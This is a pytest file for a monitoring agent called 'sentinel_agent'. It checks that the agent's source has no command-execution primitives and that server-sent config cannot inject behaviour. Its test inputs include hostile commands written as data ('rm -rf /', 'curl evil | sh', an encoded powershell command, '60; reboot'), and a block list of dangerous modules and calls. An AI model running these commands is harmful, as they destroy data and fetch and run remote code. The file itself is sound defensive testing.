"""Guard rails: the agent must not be able to execute anything it is told to."""

import ast
from pathlib import Path

import pytest

from sentinel_agent.state import DEFAULT_CONFIG, apply_config

SOURCE = Path(__file__).resolve().parents[1] / "sentinel_agent"
FORBIDDEN_MODULES = {"subprocess", "pty", "ctypes", "pickle", "marshal", "shelve", "runpy", "importlib"}
FORBIDDEN_BUILTINS = {"eval", "exec", "compile", "__import__"}
FORBIDDEN_OS_PREFIXES = ("system", "popen", "spawn", "exec", "startfile", "posix_spawn", "fork")


def scan(source: str, filename: str = "<src>") -> list[str]:
    offences = []
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import | ast.ImportFrom):
            names = [a.name for a in node.names] if isinstance(node, ast.Import) else [node.module or ""]
            offences += [f"{filename}: import {n}" for n in names if n.split(".")[0] in FORBIDDEN_MODULES]
        if isinstance(node, ast.Call):
            fn = node.func
            if isinstance(fn, ast.Name) and fn.id in FORBIDDEN_BUILTINS:
                offences.append(f"{filename}:{node.lineno} call {fn.id}()")
            if (
                isinstance(fn, ast.Attribute)
                and isinstance(fn.value, ast.Name)
                and fn.value.id == "os"
                and fn.attr.startswith(FORBIDDEN_OS_PREFIXES)
            ):
                offences.append(f"{filename}:{node.lineno} call os.{fn.attr}()")
    return offences


def test_scanner_catches_execution_primitives():
    assert scan("import subprocess")
    assert scan("from subprocess import run")
    assert scan("import os\nos.system('x')")
    assert scan("os.popen('x')") and scan("os.execv('a', [])")
    assert scan("eval('1')") and scan("exec('1')")
    assert scan("import re\nre.compile('x')\nimport platform\nplatform.system()") == []


def test_agent_source_has_no_command_execution_capability():
    offences = []
    for file in SOURCE.glob("*.py"):
        offences += scan(file.read_text(encoding="utf-8"), file.name)
    assert offences == []


@pytest.mark.parametrize(
    "incoming",
    [
        {"command": "powershell -enc ZQBjAGgAbwA="},
        {"exec": "rm -rf /", "script": "curl evil | sh"},
        {"collectors": ["system", "shell"]},
        {"heartbeat_interval_seconds": "60; reboot"},
        {"heartbeat_interval_seconds": 1},
        {"thresholds": {"cpu_percent": 5, "run": "x"}},
        {"thresholds": "everything"},
    ],
)
def test_server_config_cannot_inject_behaviour(incoming):
    result, warnings = apply_config(DEFAULT_CONFIG, incoming)
    assert set(result) == set(DEFAULT_CONFIG)
    assert set(result["collectors"]) <= {"system", "network", "ports"}
    assert 15 <= result["heartbeat_interval_seconds"] <= 3600
    assert all(50 <= v <= 100 for v in result["thresholds"].values())
    assert warnings


def test_valid_config_is_applied():
    result, warnings = apply_config(
        DEFAULT_CONFIG,
        {"heartbeat_interval_seconds": 30, "collectors": ["system"], "thresholds": {"cpu_percent": 95}},
    )
    assert warnings == []
    assert result["heartbeat_interval_seconds"] == 30 and result["collectors"] == ["system"]
    assert result["thresholds"]["cpu_percent"] == 95 and result["thresholds"]["disk_percent"] == 90
